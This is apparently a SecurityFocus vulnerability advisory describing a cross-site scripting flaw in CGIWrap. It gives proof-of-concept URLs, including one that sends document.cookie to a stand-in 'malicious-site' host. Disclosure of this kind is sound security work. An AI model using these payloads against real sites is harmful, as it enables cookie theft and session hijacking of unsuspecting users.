source: http://www.securityfocus.com/bid/3081/info

CGIWrap is a free, open-source program for running CGI securely.

CGIWrap does not filter embedded scripting commands from user-supplied input. A web user may submit a malicious link into any form which displays user-supplied input, such as guestbooks, forums, etc. Users clicking on the link will have the malicious scripting commands executed in their browser.

http://www.example.org/cgi-bin/cgiwrap/%3CS%3E
http://www.example.org/cgi-bin/cgiwrap/<S>
http://www.example.org/cgi-bin/cgiwrap/~nneul/<S>TEST</S>

JavaScript code will be executed:

http://www.example.org/cgi-bin/cgiwrap/~nneul/<SCRIPT>alert(document.domain)</SCRIPT>
http://www.example.org/cgi-bin/cgiwrap/~nneul/<SCRIPT>document.write(document.domain)</SCRIPT>
http://www.example.org/cgi-bin/cgiwrap/<IMG%20SRC=javascript:alert(document.domain)>

Stealing your Cookies issued by www.example.org, if any:

http://www.example.org/cgi-bin/cgiwrap/~nneul/<SCRIPT>window.open("http://malicious-site/save.cgi%3F"+escape(document.cookie))</SC
RIPT>